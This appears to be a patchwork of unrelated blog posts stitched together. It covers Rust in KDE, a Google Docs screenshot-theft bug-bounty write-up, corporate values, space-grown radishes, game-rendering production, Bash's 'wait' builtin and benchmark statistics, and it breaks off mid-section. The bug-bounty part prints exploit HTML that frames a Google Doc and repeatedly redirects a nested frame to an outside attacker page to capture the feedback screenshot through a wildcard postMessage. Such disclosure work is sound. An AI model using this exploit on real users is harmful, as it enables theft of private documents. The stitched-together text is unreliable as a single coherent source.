<p>Angelfish has recently switched to using the cxx crate, so you find usage examples in the <a href="https://invent.kde.org/plasma-mobile/plasma-angelfish/-/blob/d92e48e392303deda6cf3c1552f9f7b5189e2953/src/rs/adblock/src/adblock.rs">current version of the ad block code</a>.</p>

<h2 id="build-system">Build system</h2>
<p>After we have written the FFI, we need to build the Rust code as part of our project, most likely using CMake. This could be very annoying and complicated, but luckily <a href="https://github.com/AndrewGaspar/corrosion">Corrosion</a> exists to make this very easy for us.
It can build our rust code using the cargo build system, and create CMake targets for the library we built, so its easy to link against it.</p>

<h2 id="usage-in-kde">Usage in KDE</h2>
<p>Now that the implementation part is explained,
it makes sense to look into where this can be useful and where not.
Unfortunately the truth is that some distros are still not fully happy with having to package rust code,
because the rust community has a different approach to sharing code than known from the C / C++ world.
While Qt re-implements some functionality also found in other C++ libraries, to only make it necessary to package Qt and not one library for json, one for xml, for http and so on, the rust community likes to split everything into small packages, so no unnecessary code is included.</p>

<p>In Angelfish, all the rust code is optional, and Angelfish can of course still be built without Rust.</p>

<p>Possible areas in KDE that could profit from using Rust are icon and SVG theme rendering code, which could profit from using rsvg or resvg.
I can imagine it could also be useful for document thumbnailers, when a rust implementation of the file type already exists. A similar case could be KIO workers, and pretty much any other project that can profit from optional plugins.</p>

<h2 id="conclusion">Conclusion</h2>
<p>This approach to using Rust in KDE allows to make use of the many libraries and language features the ecosystem provides, without running into the infamous “rewrite it in Rust” reflex. It avoids having to create rust bindings for all KDE Frameworks and Qt only to make use of Rust, and still produces readable code.</p>

                    <p>By <a href="https://twitter.com/kl_sree">KL Sreeram</a></p><p>Google has integrated a <a href="https://www.google.com/tools/feedback">feedback sharing mechanism</a> for many of its products like Google Docs, Google Sheets and so on. This feature is supposed to help users report bugs and broken functionality to Google developers who could then work on fixing it.</p><h2 id="sending-feedback-in-google-products">Sending Feedback in Google Products</h2><p>You might have noticed a <strong>Send Feedback </strong>button at the bottom of the page while using Google Docs. It's a harmless feature, and its implemented as a feed back sharing system for Google Docs when you encounter issues. When you click on the button, a popup would appear asking you to describe the problem and this feature automatically takes a screenshot, sending (uploading) the data to Google for further review.</p><figure><img src="https://savebreach.com/content/images/2020/12/image-22.png" alt=""><figcaption>The "Send Feedback" popup in Google Docs</figcaption></figure><p>This feedback sharing feature is also implemented in many other Google products using an iFrame, embedded into the parent page (the Google Product).</p><p>This made me wonder how Google was displaying this image. I found, the image was being uploaded to Google via postMessage, and then rendered in the popup box before being sent to Google for further investigation.</p><h2 id="the-bug">The Bug</h2><p>There was some cross-origin communication happening between docs.google.com, www.google.com and feedback.googleusercontent.com (which was a sandboxed domain). Even after trying a lot I was unable to find any XSS in feedback.googleusercontent.com which could have helped me in stealing the screenshot image data.</p><p>Below is a graphical representation of the steps in this process – </p><figure><img src="https://savebreach.com/content/images/2020/12/image-23.png" alt=""><figcaption>How the screenshot was uploaded to Google servers</figcaption></figure><p>The following <code>postmessage</code> function sent the data to feedback.googlusercontent.com, however the postmessage configuration didn't allow other domains to be iFramed.</p><pre><code>windowRef.postmessage("&lt;Data&gt;","https://feedback.googleusercontent.com");</code></pre><p>However, the final <code>postmessage</code> function upon submitting the feedback was configured in a manner that allowed modifying the iFrame to an evil website</p><pre><code>windowRef.postmessage("&lt;Data&gt;","*");</code></pre><p>The wildcard scope allowed the <code>postmessage</code> data to be sent to an evil attacker controlled domain. The security misconfiguration here is the wildcard scope <code>*</code> &nbsp;that allowed me to steal and hijack Google Docs screenshots which were meant to be uploaded to Google's servers</p><p>Also, worth noting that the exploit worked in this case as Google Docs, by design has no <code>X-Frame-Options header</code>, which eventually helped exploit the cross-origin communication (through postMessage), although they do have some other protection against clickjacking and similar attacks as most features are disabled when the Google Docs pages are embedded in an iFrame.</p><h2 id="the-final-exploit">The Final Exploit</h2><p>Finally, I was able to put together all these vulnerabilities, in order to extract the Google Docs page screenshot by embedding it in a malicious iFrame and using <code>window.frames.frame.location</code> to load my exploit page from an external domain and steal user's Google Docs page screenshot</p><pre><code>&lt;html&gt;
    &lt;iframe src="https://docs.google.com/document/document_ID" /&gt;
    &lt;script&gt;
       //pseudo code
        
        
        setTimeout(function(){ alert("Hello"); }, 6000);

        function exp(){
        setInterval(function(){ 
         window.frames[0].frame[0][2].location="https://geekycat.in/exploit.html";
        }, 100);
        }
    &lt;/script&gt;
&lt;/html&gt;</code></pre><p>The above exploit gets triggered only once the user clicks on <strong>Send Feedback </strong>button. For allowing the iFrame to load, a setTimeout function executes every 6s (or, 6000 ms). To hijack the frame once it loads – the setInterval is used which tries to change the location of the iFrame every 100 ms to ensure the screenshot is stolen once the iFrame loads.</p><p>This could have allowed any attacker to steal sensitive information about your Google Docs documents and presentations, since organizations use it as part of G Suite for managing highly sensitive information. Although, this attack needs some user interaction but its not impossible given an attacker can easily convince a victim to perform the needed interaction (button click).</p><p>The <code>exploit.html</code> contains a postMessage event listener that captures the URL of the uploaded image, and the attacker successfully exfiltrates the Google Docs page screenshot in this way.</p><h2 id="video-poc-of-the-exploit">Video PoC of the Exploit</h2><p>Below is a Proof of Concept video of how the exploit worked, and how it could have allowed any attacker to steal screenshots of your private Google Docs documents by loading it in an iFrame on an attacker controlled website.</p><figure><iframe width="356" height="200" src="https://www.youtube.com/embed/isM-BXj4_80?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure><h2 id="the-bounty">The Bounty</h2><p>Google rewarded <strong>$3133.7</strong> &nbsp;for this bug under their VRP program.</p><p><a href="https://twitter.com/kl_sree">KL Sreeram</a> is a security researcher and bug bounty hunter.

    <p><strong>April, 2020</strong></p>
<p>Technology companies love to talk about their values. Unfortunately, values are highly abstract and ambivalent constructs that mean different things to different people.</p>
<p>In my opinion, the reason why certain companies (or the leadership teams) love values so much is due to a fundamental lack of inspiring visions. When your company's purpose is to make people click on useless ads, you've got to come up with something else to inspire your employees. Luckily, humans are built with descent bullshit detectors and in practice this form of corporate jargon rarely works as a motivator.</p>
<p>Recognizing the above, I believe that organizations that have a meaningful reason to exist (ie something people can stand behind) should start the other way around. They should define their purpose, spend quality time describing and documenting the world they adhere to, and then reverse engineer from that.</p>
<p>An organization that strives to be <em>fully aligned</em> with its purpose, <em>highly aligned</em> with its day to day practices and <em>loosely aligned</em> in terms of beliefs and principles is more likely to create an inspiring environment for existing and potential employees.</p>

						<p>The thought of eating "astronaut food" brings to mind a kind of instant food that is far from "farm to table." However, recent experiments aboard the ISS are improving our understanding of how to bring the farm directly into space itself.</p><p>Astronauts just ran a Veg-PONDS 02 experiment on the International Space Station. The experiment used food that was cultivated in space. Potential cultivations could include tomatoes or other plants, NASA says.</p><p>On November 30th, Kate Rubins took about 6 packs of radishes from the lab and stored them in a refrigerated unit after gathering them up—freshly grown in space. The process opens new doors for microgravity food processing to enable future long-term moon and Mars missions. The radish sprouts will be sent back to Earth early next year on SpaceX's 22nd Commercial Resupply Services mission, NASA announced.</p><figure><img src="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2000" alt="Rzodkiewka " srcset="https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=600 600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1000 1000w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=1600 1600w, https://images.unsplash.com/photo-1593026122591-4373d2182747?crop=entropy&amp;cs=tinysrgb&amp;fit=max&amp;fm=jpg&amp;ixid=MXwxMTc3M3wwfDF8c2VhcmNofDE0fHxyYWRpc2h8ZW58MHx8fA&amp;ixlib=rb-1.2.1&amp;q=80&amp;w=2400 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@jo_lanta?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Jo Lanta</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>Radishes, a well-known fresh vegetable, were chosen for the Plant Habitat-02 experiment because vegetables are well understood by scientists.

<h2>Intro</h2>



<p>This post will cover challenges and aspects of production to consider when creating new rendering / graphics techniques and algorithms – especially in the context of <strong>applied research for real time rendering</strong>. I will base this on my personal experiences, working on <strong>Witcher 2, Assassin’s Creed 4: Black Flag, Far Cry 4, and God of War</strong>.</p>



<p>Many of those challenges are easily ignored – they are <strong>real problems in production</strong>, but not necessarily there only if you only read about those techniques, or if you work on pure research, writing papers, or create tech demos.</p>



<p>I have seen statements like “why is this brilliant research technique X not used in production?” both from gamers, but also from my colleagues with academic background. And there are always some good reasons!</p>



<p>The post is also inspired by <a href="https://twitter.com/bartwronsk/status/1327509557015310336">my joke tweet</a> from a while ago about appearing smart and mature as a graphics programmer by “dismissing” most of the rendering techniques – that they are not going to work on foliage. 🙂&nbsp;And yes, I will come back to vegetation rendering a few times in this post.</p>



<p>I tend to think of this topic as well when I hear discussions about how “photogrammetry, raytracing, neural rendering, [insert any other new how topic] will be a universal answer to rendering and replace everything!”. Spoiler alert: not gonna happen (soon).</p>



<h2>Target audience</h2>



<p>Target audience of my post are:</p>



<ul><li>Students in computer graphics and applied researchers,</li><li>Rendering engineers, especially ones earlier in their career – who haven’t built their intuition yet,</li><li>Tech artists and art leads / producers,</li><li>Technical directors and decision makers without background in graphics,</li><li>Hardware engineers and architects working on anything GPU or graphics related (and curious what makes it complicated to use new HW features),</li><li>People who are excited and care about game graphics (or real time graphics in general) and would like to understand a bit “how sausages are made”. Some concepts might be too technical and too much jargon, but then feel free to skip those.</li></ul>



<p>Note that I didn’t place “pure” academic researchers in the above list – as I don’t think that pure research should be considering too many obstacles. Role of the fundamental research is inspiration and creating theory that can be later productionized by people who are experts in productionization.</p>



<p>But if you are a pure researcher and somehow got here, I’ll be happy if you’re interested in what kinds of problems might be on the long way from idea or paper to a product (and <strong>why most new genuinely good research will never find its place in products</strong>).</p>



<h2>How to interpret the guide</h2>



<p>Very important note – <strong>none </strong>of the “obstacles” I am going to describe <strong>are deal breakers</strong>.</p>



<p>Far from it – most successful tech that became state of the art violates many of those constraints! It simply means that those are challenges that will need to be overcome in some way – manual workarounds, feature exclusivity, ignoring the problems, or applying them only in specific cases.</p>



<p>I am going to describe first the <strong>use-cases</strong> – potential uses of the technology and how those impact potential requirements and constraints.</p>



<h2>Use case</h2>



<p>The categories of “use cases” deserve some explanation and description of “severity” of their constraints.</p>



<h3>Tech demo&nbsp;</h3>



<p>Tech demo is the easiest category. If your whole product is a <strong>demonstration of a given technique </strong>(whether for benchmarking, showing off some new research, artistic demoscene), most of the considerations go away.</p>



<p>You can actually retrofit everything: from the demo concept, art itself, camera trajectory to show off the technology the best and avoid any problems.</p>



<p>The main considerations will be around performance (a choppy tech demo can be seen as a tech failure) and working very closely with artists able to show it off.</p>



<p>The rest? Hack away, write one-off code – just don’t have expectations that turning a tech demo into a production ready feature is simple or easy (it’s more like the 99% of work remaining).</p>



<h3>Special level / one-off</h3>



<p>The next level “up” in the difficulty is creating some <strong>special features that are one-off</strong>. It can be some visual special effect happening in a single scene, game intro, or a single level that is different from the other ones. In this case, a feature doesn’t need to be very “robust”, and often replaces many others.</p>



<p>An example could be lighting in the jungle levels in Assassin’s Creed 4: Black Flag that I worked on.&nbsp;</p>



<div><figure><img src="https://lh3.googleusercontent.com/51bdx_bCzH7HBQ7NjppuafWVspC1jLwJ4OwbTLwYq1DLDnnOlxNGZtXby8mLGdqhnjC00WyxAfq1L3d8EIOatPflkT4phHF4Xq2WxOeUSlRCymYNEPQW3WiOeywiz8edAD592PNh" alt="" width="458" height="610"><figcaption>Source: Assassin’s Creed 4: Black Flag promo art. Notice the caustics-like lightshafts that were key rendering feature in jungle levels – and allowed us to save a lot on the shadows rendering!</figcaption></figure></div>



<p>Jungles were “cut off” from the rest of the open world by special streaming corridors and we completely replaced the whole lighting in them! Instead of relying on tree shadow maps and global lighting, we created <strong>fake “caustics”</strong> that looked much softer and played very nicely with our volumetric lighting / atmospherics system. They not only looked better, but also were much faster – obviously worked only because of those special conditions.</p>



<h3>Cinematics</h3>



<p>A slightly more demanding type of feature is cinematic-only one. Cinematics are a bit different as they can be very strictly controlled by cinematic artists and <strong>most of their aspects like lighting, character placement, or animations are faked</strong> – just like in regular cinema! Cinematics often feature fast camera cuts (useful to hide any transitions/popping) and have more computational budget due to more predictable nature (and even in 60fps console games rendered in 30fps).</p>



<div><figure><img src="https://lh3.googleusercontent.com/g3SLk16AtqBNz6TfdSXtNhMDqo6sPXIrwQUQWEjGas1fZ3vYUVLWf_vC5or3-Gen-0Z1WRlt9M46eDiBv5b1tSmU_A0aqKPbq2zR-iJ5IerV42EpuGfrgdTtJVygjhpuQ7R1_-0C" alt=""><figcaption>Witcher 2 cinematic featuring higher character LODs, nice realistic large radius bokeh and custom lighting – but notice how few objects to render are there!</figcaption></figure></div>



<h3>Regular rendering feature</h3>



<p>“Regular” features – lighting, particles, geometry rendering – are the <strong>hardest category</strong>. They need to be either very easy to implement (most of the obstacles / problems solved easily), provide huge benefits surpassing state of the art by far to facilitate the adoption pain, or have some very excited team pushing for it (never underestimate the drive of engineers or artists that really want to see something happen!).</p>



<p>Most of my post will focus on those.&nbsp;</p>



<h3>Key / differentiating feature</h3>



<p>Paradoxically, if something is a key or differentiating feature, this can alleviate many of the difficulties. Let’s take VR – there stereo, performance (low latency), and perfect AA with no smudging (so rather forget about TAA), are <strong>THE features and absolutely core to the experience</strong>. This means that you can completely ignore for example rendering foliage or some animations that would look uncannily – as being immersed and the VR experience of being there are much more important!</p>



<h2>Feature compatibility</h2>



<p>Let’s have a look at compatibility of a newly developed feature with some other common “features” (the distinction between “features”, and the next large section “pipeline” is fuzzy).</p>



<p>Features are not the most important of challenges – arguably the category I’m going to cover at the end (the “process”) is. But those are fun and easy to look at!&nbsp;</p>



<h3>Dense geometry</h3>



<p>Dense geometry like <strong>foliage </strong>– a “feature” that inspired this post – is an enemy of most rendering algorithms.</p>



<p>The main problem is that with very dense geometry (lots of overlapping and small triangles), many “optimizations” and assumptions become impossible.</p>



<p>Early Z and occlusion culling? Very hard.&nbsp;</p>



<p>Decoupling surfaces from volumes? Very hard.</p>



<p>Storing information per unique surface parametrization? Close to impossible.</p>



<p>Amount of vertices to animate and pixels to shade? Huge, shaders need simplification!</p>



<div><figure><img src="https://lh4.googleusercontent.com/P3m7eTgVGodadf6TSd7Ca4Th8wedlR3AEr0wghmVTz0klnfU2hUTq4K1jRdhLljGMRQKgiG-pq02Ayc5Dtllma_jLOF60rtSCx0jID78CYen8cyAW3z2N_bCPYh7KvemZ2k8bWIX" alt=""><figcaption>Witcher 2 foliage – that density! Still IMO one of the best forests in any game.</figcaption></figure></div>



<p>Dense geometry through which you can see (like grass blades) is incompatible with many techniques, for example lightmapping (storing a precomputed lighting per every grass blade texel would be very costly).</p>



<p>If a game has a tree here and there or is placed in a city, this might not be a problem. But for any “natural” environment, a big chunk of the productionization of any feature is going to be combining it to coexist well with foliage.</p>



<h3>Alpha testing</h3>



<p>Alpha testing is an extension of the above, as it disables even more hardware features / optimizations.</p>



<p>Alpha testing is a technique, when a pixel evaluates “alpha” value from a texture or pixel shader computations, and <strong>based on some fixed threshold, doesn’t render/write it</strong>.</p>



<p>It is much faster than alpha blending, but for example disables early z writes (early z tests are ok), and requires raytracing hit shaders and reading a texture to decide if a texel was opaque or not.</p>



<p>It also makes antialiasing very challenging (forget about regular MSAA, you have to emulate alpha to coverage…).</p>



<p>For a description and great visual explanation of some problems, see this blog post of <a href="https://bgolus.medium.com/anti-aliased-alpha-test-the-esoteric-alpha-to-coverage-8b177335ae4f">Ben Golus</a>.</p>



<h3>Animation – skeletal</h3>



<p>Most animators work with “skeletal animations”. <strong>Creating rigs, skinning meshes, animating skeletons</strong>. When you create a new technique for rendering meshes that relies on some heavy precomputations, would animators be able to “deform” it? Would they be able to plug it into a complicated animation blending system? How does it fit in their workflow?</p>



<p>Note that it can also mean rigid deformations, like a rotating wheel – it’s much cheaper to render complicated objects as a skinned whole, than splitting them.</p>



<p>And animation is a must, cannot be an afterthought in any commercial project.</p>



<figure><img src="https://lh5.googleusercontent.com/WBPNVuhqPnwXvUjbrp1UpzraK24bQT3VrXJgslGPgwWqC2M__So3SISqaiBrNytVVvy7HqVV6V64o1VFsAM5NxbzOEn5lwll6ayTOd49M5oC2rF9AAHk5ryI--vv8lqe2rCPWBoU" alt=""><figcaption>Witcher 2 trebuchets were not people, but also had “skeletons” and “bones” and were using skeletal animations!</figcaption></figure>



<h3>Animation – procedural and non-rigid</h3>



<p>The next category of animations are “procedural” and non-rigid. Procedural animations are useful for any animation that is “endless”, relatively simple, and shouldn’t loop too visibly. The most common example is <strong>leaf shimmer and branch movement</strong>.</p>

    <p><em>Bash’s ‘wait’ builtin helps me understand Bash scripting as a language</em></p>

<p>I was browsing the source code of the main script in the <a href="https://github.com/RaymiiOrg/bash-http-monitoring">bash-http-monitoring</a> project that had been shared on a social news site recently. The general idea was that it fired off a number of background web requests to run in parallel and eventually produce a report on the availability of various websites. Nice, neat and simple.</p>

<p>In the main part of the project’s <code>srvmon</code> script, I saw this:</p>

<div><div><pre><code><span># Do the checks parallel</span>
<span>for </span>key <span>in</span> <span>"</span><span>${</span><span>!urls[@]</span><span>}</span><span>"</span>
<span>do
  </span><span>value</span><span>=</span><span>${</span><span>urls</span><span>[</span><span>$key</span><span>]</span><span>}</span>
  <span>if</span> <span>[[</span> <span>"</span><span>$(</span><span>jobs</span> | <span>wc</span> <span>-l</span><span>)</span><span>"</span> <span>-ge</span> <span>${</span><span>maxConcurrentCurls</span><span>}</span> <span>]]</span> <span>;</span> <span>then</span> <span># run 12 curl commands at max parallel</span>
      <span>wait</span> <span>-n</span>
  <span>fi
  </span>doRequest <span>"</span><span>$key</span><span>"</span> <span>"</span><span>$value</span><span>"</span> &amp;
<span>done
</span><span>wait</span>
</code></pre></div></div>

<p>I noticed the use of <code>wait</code> in those two places and was intrigued; although I could guess what it did, I wanted to learn more. On digging in a little, and reflecting on it, it struck me that <code>wait</code> helps me understand better the origins of shell scripting and why it seems to be often misunderstood.</p>

<p><strong>The <code>wait</code> builtin in action</strong></p>

<p>First, what is <code>wait</code>? Well, it’s (usually a) builtin, i.e. a command that is built in to the shell executable itself, rather than existing as a separate program. The headline description is that <code>wait</code> “waits for job completion and returns the exit status”. The <a href="https://en.wikipedia.org/wiki/Wait_(command)">Wikipedia entry</a> for it notes that it’s a builtin because it “<em>needs to be aware of the job table of the current shell execution environment</em>”, which makes sense, given its purpose.</p>

<p>While the above snippet of code gives a couple of examples, I thought I’d spend a coffee writing a little exploratory script called <code>jobwait</code> to feel how <code>wait</code> can work. Here it is:</p>

<div><div><pre><code><span>#!/usr/bin/env bash</span>

log<span>()</span> <span>{</span>
  <span>echo</span> <span>"</span><span>$(</span><span>date</span> +%H:%M:%S<span>)</span><span> </span><span>$*</span><span>"</span>
<span>}</span>

createjob<span>()</span> <span>{</span>
  <span>local time</span><span>=</span><span>$1</span>
  <span>local </span><span>message</span><span>=</span><span>$2</span>
  <span>(</span><span>sleep</span> <span>"</span><span>$time</span><span>"</span> <span>&amp;&amp;</span> log <span>"</span><span>$message</span><span>"</span><span>)</span> &amp;
  log <span>"created job '</span><span>$message</span><span>' (</span><span>${</span><span>time</span><span>}</span><span>s) PID=</span><span>$!</span><span>"</span>
<span>}</span>

main<span>()</span> <span>{</span>
  createjob 10 medium
  createjob 15 long
  createjob 5 short
  log <span>"jobs created"</span>
  <span>wait</span> <span>-n</span> <span>&amp;&amp;</span> log <span>"a job has finished"</span>
  <span>wait</span> <span>&amp;&amp;</span> log <span>"all jobs have finished"</span>
<span>}</span>

main <span>"</span><span>$@</span><span>"</span>
</code></pre></div></div>

<p>Running this script produced the following output - note the times on each of the log records, which shows when each log record was issued:</p>

<div><div><pre><code>; ./jobwait
09:03:11 created job 'medium' (10s) PID=72679
09:03:11 created job 'long' (15s) PID=72682
09:03:11 created job 'short' (5s) PID=72685
09:03:11 jobs created
09:03:16 short
09:03:16 a job has finished
09:03:21 medium
09:03:26 long
09:03:26 all jobs have finished
;
</code></pre></div></div>

<p>Now there’s nothing unexpected about this; nevertheless, it was quite satisfying seeing things happen in the order that they did. Note that <code>wait</code> returns the job exit status too, and with the use of <code>&amp;&amp;</code> I’m ignoring that here at my peril, but it’s only a test script.</p>

<p>The <code>-n</code> option makes <code>wait</code> wait for the next job to terminate, whatever that job is. So here we see that the “a job has finished” log entry is issued as soon as one of the jobs terminates - the ‘short’ one, in this case.</p>

<p><strong>The shell as a command environment</strong></p>

<p>Now we know what <code>wait</code> can do, I’d like to think a little bit about what it represents, too.</p>

<p>Recently my learning radar has been picking up various conversations where it seemed to me that people were <a href="https://twitter.com/qmacro/status/1332303180240216066">misunderstanding what shell scripting is</a>. It also came up this month in a Lobster thread, where the user “pm” really <a href="https://lobste.rs/s/yeloyn/minimal_safe_bash_script_template#c_q4gyqw">helped me put my finger on</a> what is frustrating about the “Bash vs a real programming language” discussion.</p>

<p>The shell is like a <a href="https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop">REPL</a> to your operating system, an interactive environment where you can have a conversation with it - manage resources, execute programs and so on. In that sense, the language of that conversation needs to be simple and have minimal noise. You want to just type something in and have it happen.</p>

<p>Moreover, you want to specify values with as little fuss as possible. Run a program that operates on a word, or a list of words, or a file or list of files - you don’t want to be messing around with having to quote those things in the basic case. And the facilities that the REPL provides to enable you to take full advantage of the resources and programs you’re working with, are super important. I’m thinking of the Unix pipeline, and IO redirection as two great examples of that.</p>

<p>That reference to Unix reminds me of a wonderful paper written in 1976 by one of Unix’s fathers, Ken Thompson. It’s <a href="https://archive.org/details/theunixcommandlanguage">THE UNIX COMMAND LANGUAGE</a> which is available via the Internet Archive but has also been made more consumable in different formats in <a href="https://susam.github.io/tucl/">this lovely repository</a> too. This paper is purportedly the first ever written about the Unix shell, and is a great read. It has a beautifully simple introduction to subshells, pipelines and IO redirection too.</p>

<p>Perhaps more subtly, what we know as the source for shell scripting today is referred to in the paper’s title as a “command language”, and that’s what it is. There is much in the paper that is quoteworthy, but I’ll pick just one here that helps me think about what the shell (and, by implication, its language) is:</p>

<p>“<em>The Shell, and the commands it executes, form an expression language … [which is] easily extensible</em>”</p>

<p>So this REPL, our interface to the operating system and its resources, is a command environment and our direct interaction with it is via a command language that has been designed to express our intentions in a straighforward and as consistent a way as possible.</p>

<p>Here’s another quote, from the section “THE SHELL AS A COMMAND”:</p>

<p>“<em>The Shell is just another command and by redirecting its standard input, it is possible to execute commands from files.</em>”</p>

<p><strong>A natural progression to scripting</strong></p>

<p>So it’s at this point in this thinking journey that we start to transition from a REPL, where the interaction is direct … to a collection of commands that can be saved in a file and passed to the shell, which I guess one could see as indirect interaction.</p>

<p>This of course is a move to scripting, as intentional collections of command language elements. And this is where <code>wait</code> makes a lot of sense; perhaps it would be used interactively, but it seems more useful to me as a way of getting things to pause while other things complete, when in indirect mode … in unattended command language execution mode. Scripting.</p>

<p>The transition from using the command language directly (including the syntax that allows us to join programs together in pipelines and manage input and output) to scripting, is in this way very subtle, and feels to me like a natural conclusion. And the features that make the command environment and its language so useful in the context of direct interaction in the REPL, are exactly those features that are available for scripting too.</p>

<p>To me, this is the essence of shell scripting, and explains why it is how it is. While it makes sense to write individual programs in whatever language one finds suitable – while of course making sure those programs behave in predictable and useful ways in the context of the command environment, especially in relation to STDIN, STDOUT and STDERR – it makes absolute no sense to me whatsoever to suggest that shell scripting itself should be replaced by “a modern language” (whatever that means).</p>

<p>To echo a (deliberately preposterous) concept mentioned in the Lobsters thread earlier, try replacing your shell with a “modern language” REPL such as Node.js’s or Python’s, and see how your productivity plummets. Try harnessing operating system resources, executing programs and filtering their output, or submitting background jobs (and <code>wait</code>ing for them to complete before proceeding further) - and you’ll soon come unstuck.</p>

<p>The shell is how it is for a reason. I’m happy with that.</p>

  <p>Physicists say that a measurement result given without an error estimate is worthless. This applies
to benchmarking as well. We not only want to know how performant a computer program or a system is, 
but we also want to know if we can trust the performance numbers. This article explains how to compute
uncertainty intervals and how to avoid some traps caused by applying commonly known
statistical methods without validating their assumptions first.</p>

<!--more-->

<p>In my previous posts I focused on building a tool that can measure performance of a database system.
That simple tool gave a single value as its output. If you ran it multiple times, you’d notice, that even
when measuring the performance of the same server again and again, the results are slightly different 
each time.</p>


<p>There are several sources of variance of performance:</p>

<ul>
  <li>
    <p>Unstable hardware performance. Many computers allow dynamic CPU frequency scaling, so their speed of processing
is not constant. The frequency can be changed in response to load or temperature change. When benchmarking
you should beware of these effects, because they can introduce a lot of variance into the results. It is recommended
to lock CPU frequency to a constant value low enough that it can be maintained for the whole measurement time, 
without the risk of thermal-throttling. Storage is also another source of big variance. You typically have
no control over where the operating system decides to store data on a spinning drive.</p>
  </li>
  <li>
    <p>Complexity of the software layers running the benchmarked program. For example JVM based programs manage memory
by GC, which kicks in at random points in time. Even modern concurrent GCs impose some performance
penalty when running, despite not causing a full freeze (pause) of the process threads. 
There is also a lot of noise introduced by code compilation when the JVM is not yet warmed up. This applies likely to other
managed runtimes as well.</p>
  </li>
  <li>
    <p>Sharing the same hardware between multiple applications or services. If the service you’re benchmarking shares
resources with other apps, then activity of those other apps will affect the results of your measurement. 
If possible, try to lock exclusive access to physical devices critical to the performance of 
the program you’re measuring.</p>
  </li>
  <li>
    <p>External or internal asynchronous signals that need to be handled, e.g. network traffic, device interrupts, etc.
Even if the benchmark program doesn’t use network or any peripheral devices, the system needs to spend a tiny 
amount of computing power to handle them – and that power might be taken from the benchmarked app.</p>
  </li>
  <li>
    <p>Caching effects. You may notice that an disk I/O heavy benchmark may run faster the second time you run it,
if you don’t evict the page cache before each run. Some caches may be easy to reset, but some may be inaccessible.</p>
  </li>
  <li>
    <p>Finally the benchmarked program itself might not have truly deterministic performance profile. For example a database
system might want to run periodic tasks to cleanup dead data, etc.</p>
  </li>
</ul>

<p>There are probably many other reasons that I missed. While it is worth spending some time on minimizing 
the biggest sources of noise, it may be uneconomical or even outright impossible to get rid of all of the
noise. Therefore your results will always have some degree of variance.</p>


<p>Because the measured value behaves randomly, it can be modelled by a random variable. 
For further reference, let’s call it <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span>.
We can characterize the performance of the system by the statistical distribution
of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span>. Of course, we never know the true distribution, but we can get some estimate
of it by measuring (observing) the value <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span> times and applying some exciting maths to them to get a few useful numbers.</p>

<p>Programmers very frequently compute basic satictics such as:</p>
<ul>
  <li>Arithmetic mean – estimates of the <em>expected value</em> of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span></li>
  <li>Standard deviation – estimates how much values sampled from <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span> are dispersed around the mean and is useful to judge the stability of the performance. 
This doesn’t depend on the number of observations <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span></span>, because this is a property of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span>. If you’re getting a high standard deviation of the results, 
you may want to look at eliminating some of the sources of noise mentioned in the earlier section.</li>
  <li>Standard error of the mean – estimates how far the mean we estimated from the sample could be from the true expected value of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span></span>. Typically
we should expect this gets smaller the more measurements (more information about the underlying distribution) we have.</li>
  <li>Percentiles / Histogram – can be used to visualize the distribution and is particularly useful when the distribution is not normal, e.g. in cases
like response-time distribution. High percentiles like 99.9% can give a lot of useful information about hiccups in the system caused by e.g. GC, etc.</li>
</ul>


<p>The standard error <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mover accent="true"><mi>X</mi><mo>ˉ</mo></mover></msub></mrow><annotation encoding="application/x-tex">s_{\bar{X}}</annotation></semantics></math></span></span> of the mean is a useful metric that describes how accurately 
we estimated the expected value. We can estimate it from the data by using the following formulas:</p>

